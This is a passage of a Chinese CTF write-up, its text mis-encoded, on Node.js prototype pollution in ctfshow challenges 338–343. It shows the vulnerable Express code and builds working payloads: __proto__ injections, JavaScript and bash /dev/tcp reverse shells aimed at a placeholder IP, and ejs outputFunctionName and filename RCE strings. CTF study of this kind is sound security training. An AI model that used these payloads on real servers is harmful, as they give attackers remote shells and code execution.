åˆ°ä¸€ä¸ªç©ºå¯¹è±¡ä¸­ï¼‰</li></ul><blockquote><p>å­˜åœ¨å½±å“ç›®æ ‡ç±»å‹çš„åŒå‹ï¼Œè¯¥åŒå‹çš„å‚æ•°å¯æ§</p></blockquote><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/%E6%B1%A1%E6%9F%93.png"></p><p><strong>åŸå‹é“¾æ±¡æŸ“</strong>åˆ©ç”¨çš„å…³é”®å°±æ˜¯æ‰¾åˆ°å¯ä»¥è¦†ç›–çš„å±æ€§æˆ–è€…æ–¹æ³•ã€‚</p><p>è¿™ç±»æ¼æ´çš„å…³é”®ä¸»è¦æ˜¯åœ¨ compile ç¼–è¯‘ æˆªæ–­ï¼Œé€šè¿‡åŸå‹é“¾æ±¡æŸ“è¦†ç›–æŸäº›å±æ€§ï¼Œåœ¨ç¼–è¯‘è¿‡ç¨‹ä¸­æ³¨å…¥æ¨¡æ¿ï¼Œåœ¨æ¸²æŸ“çš„æ—¶å€™å°±ä¼šæ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„æ¶æ„ä»£ç ã€‚</p><p>é™åˆ¶ï¼š</p><ul><li>ä¿è¯èƒ½å¤Ÿæ‰§è¡Œåˆ°æ¸²æŸ“é˜¶æ®µï¼Œå› ä¸ºè¦†ç›–æŸäº›å±æ€§ä¼šå¯¼è‡´è«åå…¶å¦™çš„å¼‚å¸¸</li><li>è¢«è¦†ç›–çš„å±æ€§æ— ç¡¬ç¼–ç é»˜è®¤å€¼</li></ul><h3 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="ctfshow338"><a href="#ctfshow338" class="headerlink" title="ctfshow338"></a>ctfshow338</h4><p>ä¸‹è½½é™„ä»¶</p><blockquote><p>npm install</p><p>node bin/www</p></blockquote><p>index.jsï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><br><span class="hljs-comment">/* GET home page. */</span><br>router.get(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; title: <span class="hljs-string">&#x27;Express&#x27;</span> &#125;);<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>login.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  <span class="hljs-keyword">var</span> flag=<span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user,req.body);<br>  <span class="hljs-keyword">if</span>(secert.ctfshow===<span class="hljs-string">&#x27;36dboy&#x27;</span>)&#123;<br>    res.end(flag);<br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123;ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span>+JSON.stringify(user)&#125;);<br>  &#125;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>common.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php">module.exports = &#123;<br>  copy:copy<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">copy</span>(<span class="hljs-params">object1, object2</span>)</span>&#123;<br>    <span class="hljs-keyword">for</span> (let key in object2) &#123;<br>        <span class="hljs-keyword">if</span> (key in object2 &amp;&amp; key in object1) &#123;<br>            copy(object1[key], object2[key])<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            object1[key] = object2[key]<br>        &#125;<br>    &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><p>é¦–é¡µè²Œä¼¼æ²¡å•¥ç”¨ï¼Œåœ¨ login.js ä¸­çœ‹åˆ° secert æ²¡æœ‰ ctfshow è¿™ä¸ªå±æ€§ï¼Œè€Œ<code>secert.ctfshow===&#39;36dboy&#39;</code>å°±æœ‰ flagï¼Œæˆ‘ä»¬å‘ç° select æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œè€Œ user ä¹Ÿæ˜¯ä¸€ä¸ªæ•°ç»„(å…·æœ‰åŒå‹)ï¼Œè€Œä¸”é€šè¿‡<code>utils.copy(user,req.body)</code>ä¼ å…¥æ•°å€¼(copy å’Œ merge ç±»æ¯”)ï¼Œreq.body æ˜¯ POST è¯·æ±‚(å‚æ•°å¯æ§)</p><p>é‚£ä¹ˆæŠ“åŒ…ä¼ å…¥å³å¯</p><blockquote><p>{â€œ__proto__â€œ:{â€œctfshowâ€:â€36dboyâ€}}</p></blockquote><h4 id="ctfshow339"><a href="#ctfshow339" class="headerlink" title="ctfshow339"></a>ctfshow339</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span>;<br>  <span class="hljs-keyword">var</span> secert = &#123;&#125;;<br>  <span class="hljs-keyword">var</span> sess = req.session;<br>  let user = &#123;&#125;;<br>  utils.copy(user, req.body);<br>  <span class="hljs-keyword">if</span> (secert.ctfshow === flag) &#123;<br>    res.end(flag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; ret_code: <span class="hljs-number">2</span>, ret_msg: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span> + JSON.stringify(user) &#125;);<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>å’Œ 338 ä¸åŒçš„æ˜¯ ctfshow===å˜é‡ï¼Œæˆ‘ä»¬å¯çŸ¥æœ€åçš„ 32 ä½å­—ç¬¦ä¸²å°±åœ¨è¿™å˜é‡ flagï¼Œæ˜¯ä¸å¯é¢„æµ‹çš„å€¼ï¼›å¤šäº†ä¸€ä¸ª api.js</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">var</span> express = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>);<br><span class="hljs-keyword">var</span> router = express.Router();<br><span class="hljs-keyword">var</span> utils = <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>);<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(),<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>);<br>  res.render(<span class="hljs-string">&#x27;api&#x27;</span>, &#123; query: <span class="hljs-function"><span class="hljs-keyword">Function</span>(<span class="hljs-params">query</span>)(<span class="hljs-params">query</span>)&#125;)</span>;<br>&#125;);<br>module.exports = router;<br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬æ±¡æŸ“ç‚¹ä¸€æ ·ï¼Œä»ç„¶æ˜¯</p><blockquote><p>let user = {};<br>utils.copy(user,req.body);</p></blockquote><p>è§¦å‘ç‚¹ï¼š</p><blockquote><p>res.render(â€˜apiâ€™, { query: Function(query)(query)});</p></blockquote><p>åŒ¿åå‡½æ•°ï¼Œå’Œ Code-Breaking Thejs å¾ˆç›¸åƒ</p><blockquote><p>Function(query)(query)è¿™ç§åŒ¿åå‡½æ•°çš„å†™æ³•ï¼Œquery ä¸å†æ˜¯ä¼ æ•°å€¼ï¼Œè€Œæ˜¯ä¼ å…¥æ‰§è¡Œä»£ç ï¼Œç„¶åè‡ªæ‰§è¡Œã€‚æœ‰ç‚¹å’Œ eval ç±»ä¼¼ï¼Œä½†è¿™é‡Œæ›´å¥½çš„è§£é‡Šæ˜¯ Function å¯¹è±¡</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>å®˜æ–¹æ˜¯è¿™æ ·å®šä¹‰çš„ï¼š<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/%E7%AB%8B%E5%8D%B3%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0%E8%A1%A8%E8%BE%BE%E5%BC%8F">IIFEï¼ˆç«‹å³è°ƒç”¨å‡½æ•°è¡¨è¾¾å¼ï¼‰</a>æ˜¯ä¸€ä¸ªåœ¨å®šä¹‰æ—¶å°±ä¼šç«‹å³æ‰§è¡Œçš„ JavaScript å‡½æ•°ã€‚</p></blockquote><p>ç„¶åæƒ³æ³•æ˜¯é€šè¿‡ login.js çš„ copy æ±¡æŸ“åˆ° api.js çš„ queryï¼Œåå¼¹ä¸€ä¸ª shell</p><p>js å¦‚ä½•åå¼¹ shell<a href="https://xz.aliyun.com/t/7184">https://xz.aliyun.com/t/7184</a></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">//jsåŸç”Ÿsocketå»ºç«‹è¿æ¥</span><br><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, [])<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(ç›‘å¬ç«¯å£, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br><span class="hljs-comment">//æ±¡æŸ“ä¼ å…¥</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>&#125;<br>&#125;<br><br><span class="hljs-comment">//æ‹¼æ¥</span><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = require(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = require(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>éœ€è¦å¯¹ä¸Šé¢çš„ä»£ç â€æ ¼å¼åŒ–â€œï¼Œpayloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¼ å…¥æ‹¼æ¥å®Œæˆçš„ payloadï¼Œpost ä¼ è‡³/loginï¼Œæ¥ç€è®¿é—®/api è§¦å‘åæ— å“åº”ï¼Œæ£€æŸ¥å‘ç°éš§é“å¯åŠ¨æˆåŠŸï¼Œä½†æ˜¯æ²¡æœ‰ä»»ä½•è¿æ¥</p><p>è§£é‡Šå¦‚ä¸‹ï¼š</p><ul><li>Function ä¸­ require æ˜¯æ¨¡å—å†…çš„ï¼Œæ— æ³•è°ƒç”¨å…¨å±€å˜é‡</li></ul><p><a href="https://github.com/nodejs/node-v0.x-archive/issues/2017">https://github.com/nodejs/node-v0.x-archive/issues/2017</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211121223733792.png"></p><ul><li>å› ä¸º node æ˜¯åŸºäº chrome v8 å†…æ ¸çš„ï¼Œè¿è¡Œæ—¶ï¼Œå‹æ ¹å°±ä¸ä¼šæœ‰ <code>require</code> è¿™ç§å…³é”®å­—ï¼Œæ¨¡å—åŠ è½½ä¸è¿›æ¥ï¼Œè‡ªç„¶ shell å°±åå¼¹ä¸äº†äº†ã€‚ä½†åœ¨ node äº¤äº’ç¯å¢ƒï¼Œæˆ–è€…å†™ js æ–‡ä»¶æ—¶ï¼Œé€šè¿‡ node è¿è¡Œä¼šè‡ªåŠ¨æŠŠ <code>require</code> è¿›è¡Œç¼–è¯‘ã€‚</li></ul><p><a href="https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js">https://stackoverflow.com/questions/31931614/require-is-not-defined-node-js</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122000430212.png"></p><p><a href="https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing">https://stackoverflow.com/questions/4599857/are-eval-and-new-function-the-same-thing</a></p><p>æ­¤å¤„çš„åŒ¿åå‡½æ•°åŸå‹æ˜¯é€šè¿‡<code>new Function()</code>åˆ›å»ºè€Œæ¥çš„ï¼Œä¹Ÿå°±æ˜¯è¯´ç­‰ä»·äºä¸Šé¢çš„æˆªå›¾æƒ…å½¢ï¼Œæ²¡æ³•ç›´æ¥åœ¨<code>Function</code>ä¸­å¼•å…¥ <code>require</code></p><p>æ€»ç»“å°±æ˜¯ï¼Œä½¿ç”¨çš„æ˜¯ nodejs æ­å»ºçš„æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ requireï¼Œä½†å®ƒæ— æ³•åœ¨åŒ¿åå‡½æ•°å†…è°ƒç”¨å…¨å±€å˜é‡(http)ï¼Œæ¢ä¸€ç§å†™æ³•</p><blockquote><p>var require = global.require || global.process.mainModule.constructor._load</p></blockquote><p>åŒæ—¶å¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬çœ‹åˆ° nodejs æ˜¯é¢å‘æœåŠ¡å™¨ç«¯çš„ï¼Œå®ƒå…·æœ‰ require å…³é”®å­—ï¼Œä½†åœ¨æµè§ˆå™¨çš„æ§åˆ¶å°æ˜¯æ²¡æœ‰çš„</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">return</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>  <span class="hljs-keyword">var</span> net = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;net&#x27;</span>),<br>    cp = <span class="hljs-built_in">global</span>.process.mainModule.constructor._load(<span class="hljs-string">&#x27;child_process&#x27;</span>),<br>    sh = cp.spawn(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>, []);<br>  <span class="hljs-keyword">var</span> client = <span class="hljs-keyword">new</span> net.Socket()<br>  client.connect(ç›‘å¬ç«¯å£, <span class="hljs-string">&#x27;IP&#x27;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    client.pipe(sh.stdin)<br>    sh.stdout.pipe(client)<br>    sh.stderr.pipe(client)<br>  &#125;)<br>  <span class="hljs-keyword">return</span> <span class="hljs-regexp">/a/</span><br>&#125;)();<br><br>&#123;<br><span class="hljs-string">&quot;__proto__&quot;</span>:&#123;<br><span class="hljs-string">&quot;query&quot;</span>:<span class="hljs-string">&quot;return (function () &#123;</span><br><span class="hljs-string">  var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),</span><br><span class="hljs-string">    cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),</span><br><span class="hljs-string">    sh = cp.spawn(&#x27;/bin/sh&#x27;, [])</span><br><span class="hljs-string">  var client = new net.Socket()</span><br><span class="hljs-string">  client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function () &#123;</span><br><span class="hljs-string">    client.pipe(sh.stdin)</span><br><span class="hljs-string">    sh.stdout.pipe(client)</span><br><span class="hljs-string">    sh.stderr.pipe(client)</span><br><span class="hljs-string">  &#125;)</span><br><span class="hljs-string">  return /a/</span><br><span class="hljs-string">&#125;)();</span><br><span class="hljs-string">&quot;</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return (function()&#123;var net = global.process.mainModule.constructor._load(&#x27;net&#x27;),cp = global.process.mainModule.constructor._load(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(ç›‘å¬ç«¯å£, &#x27;IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;query&quot;</span>: <span class="hljs-string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;)&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¦‚æœæ˜¯ windows ç³»ç»Ÿå°±æŠŠ <code>/bin/sh</code> æ¢æˆ <code>cmd.exe</code> å°±å¯ä»¥äº†</p><h4 id="ctfshow-340"><a href="#ctfshow-340" class="headerlink" title="ctfshow 340"></a>ctfshow 340</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> express = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;express&#x27;</span>)<br><span class="hljs-keyword">var</span> router = express.Router()<br><span class="hljs-keyword">var</span> utils = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;../utils/common&#x27;</span>)<br><span class="hljs-comment">/* GET home page.  */</span><br>router.post(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;body-parser&#x27;</span>).json(), <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">req, res, next</span>) </span>&#123;<br>  res.type(<span class="hljs-string">&#x27;html&#x27;</span>)<br>  <span class="hljs-keyword">var</span> flag = <span class="hljs-string">&#x27;flag_here&#x27;</span><br>  <span class="hljs-keyword">var</span> user = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-built_in">this</span>.userinfo = <span class="hljs-keyword">new</span> (<span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-built_in">this</span>.isVIP = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAdmin = <span class="hljs-literal">false</span><br>      <span class="hljs-built_in">this</span>.isAuthor = <span class="hljs-literal">false</span><br>    &#125;)()<br>  &#125;)()<br>  utils.copy(user.userinfo, req.body)<br>  <span class="hljs-keyword">if</span> (user.userinfo.isAdmin) &#123;<br>    res.end(flag)<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">return</span> res.json(&#123; <span class="hljs-attr">ret_code</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">ret_msg</span>: <span class="hljs-string">&#x27;ç™»å½•å¤±è´¥&#x27;</span> &#125;)<br>  &#125;<br>&#125;)<br><span class="hljs-built_in">module</span>.exports = router<br></code></pre></td></tr></table></figure><p>è¿™é‡Œé¢çš„ userinfo åŸå‹ä¸åŒäº†</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211122183340194.png"></p><p>å†å¥—ä¸€ä¸ª<code>__proto__</code>å³å¯</p><h4 id="ctfshow-341"><a href="#ctfshow-341" class="headerlink" title="ctfshow 341"></a>ctfshow 341</h4><p>è¿™é‡Œä»‹ç»ä¸¤ä¸ªè‡ªåŠ¨åŒ–æ‰¾æ´ï¼š</p><p>snyk çš„ä½¿ç”¨</p><p>åœ¨å®˜ç½‘æ³¨å†Œç™»å½•ï¼Œåˆæ¬¡ç™»å½•è¦å…³è” Githubï¼Œæ‰¾åˆ° apiï¼Œæœ¬åœ°ï¼š</p><blockquote><p>npm install snyk -g</p><p>snyk config set api=</p><p>snyk test</p></blockquote><p>audit çš„ä½¿ç”¨</p><blockquote><p>npm audit</p></blockquote><ul><li>ejs</li></ul><p>å› ä¸ºè¿™é¢˜æ²¡æœ‰/api è§¦å‘ç‚¹ï¼Œä½¿ç”¨ 338 å­˜åœ¨çš„ ejs RCEï¼Œå› ä¸ºæ˜¯éé¢„æœŸæ²¡æœ‰æ”¾å‡ºæ¥ï¼Œä½¿ç”¨ snyk æ‰«å‡ºæ¥</p><p><a href="https://security.snyk.io/vuln/SNYK-JS-EJS-1049328">https://security.snyk.io/vuln/SNYK-JS-EJS-1049328</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<span class="hljs-attr">&quot;__proto__&quot;</span>:&#123;<span class="hljs-attr">&quot;filename&quot;</span>:<span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(\&#x27;child_process\&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1&quot;</span>&#x27;);var __tmp2<span class="hljs-string">&quot;&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ä¸ªå…¥å£ outputFunctionNameï¼š<a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>  <span class="hljs-attr">&quot;__proto__&quot;</span>: &#123;<br>    <span class="hljs-attr">&quot;outputFunctionName&quot;</span>: <span class="hljs-string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/IP/ç›‘å¬ç«¯å£ 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„åˆ° login.js çš„<code>this.userinfo = new function()&#123;...</code>æ‰€ä»¥ä¸Šé¢çš„ payload å†åµŒå¥—ä¸€ä¸ª<code>__proto__</code></p><h4 id="ctfshow342ã€343"><a href="#ctfshow342ã€343" class="headerlink" title="ctfshow342ã€343"></a>ctfshow342ã€343</h4><ul><li>jade</li></ul><p><a href="https://xz.aliyun.com/t/7025#toc-2">https://xz.aliyun.com/t/7025#toc-2</a></p><p><a 